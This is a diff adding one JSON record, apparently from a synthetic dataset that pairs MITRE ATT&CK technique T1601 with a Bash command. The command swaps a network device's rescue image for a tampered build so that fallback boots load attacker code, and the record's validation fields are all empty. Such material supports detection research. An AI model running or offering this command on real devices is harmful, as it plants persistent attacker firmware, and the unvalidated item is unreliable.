@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "install -m 0644 /root/rescue_mod.img /mnt/flash/rescue.img && sha256sum /mnt/flash/rescue.img > /mnt/flash/rescue.img.sha256 && diff -u /var/backups/rescue.img.sha256 /mnt/flash/rescue.img.sha256 || true",
+  "explanation": "Replaces the device's rescue image with a malicious variant and records its checksum, ensuring fallback boots load attacker code.",
+  "rationale_steps": [
+    "Swap the recovery/rescue image with a tampered build.",
+    "Generate a checksum artifact to normalize the change.",
+    "Optionally compare to a baseline for tracking modifications."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-dc873ff7-974e5fa1",
+  "source_prompt_hash": "dc873ff7",
+  "timestamp_utc": "2025-09-30T04:57:26.660610Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
